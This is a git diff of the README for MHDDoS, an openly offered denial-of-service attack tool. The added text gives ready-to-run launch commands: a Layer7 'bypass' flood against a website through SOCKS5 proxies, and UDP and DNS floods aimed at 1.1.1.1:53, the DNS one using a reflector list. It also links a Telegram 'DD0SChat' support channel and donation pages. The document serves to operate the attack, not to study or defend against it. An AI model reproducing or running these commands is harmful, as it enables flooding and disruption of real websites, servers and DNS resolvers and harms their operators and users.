@@ -56,7 +56,6 @@
   * 🌠 TOOLS | Console Tools
   * 👑 HELP | Show Usage Script
 
-* Layer4 DDoS Script
 #### Issues ? 
  * Telegram : https://t.me/DD0SChat
  * Discord : MH_ProDev#2681
@@ -104,13 +103,27 @@ pip3 install -r requirements.txt
 
 **Launch Script**
 
+* Layer7 (Website):
 ```console
-python3 start.py
 python3 start.py bypass https://example.com 5 1000 socks5.txt 100 100
+```
+
+* Layer4 (Server/Home):
+```console
+python3 start.py udp 1.1.1.1:53 1 100
+python3 start.py dns 1.1.1.1:53 1 100 dns.txt
+```
+
+* Tools/Help:
+```console
+python3 start.py tools
+python3 start.py help
 ```
 
 [python3]: https://python.org 'Python3'
 [github]: https://github.com/MHProDev/MHDDoS/issues 'GitHub'
+
+---
 
 **💰 Donation Links:**
 * https://idpay.ir/mh-prodev
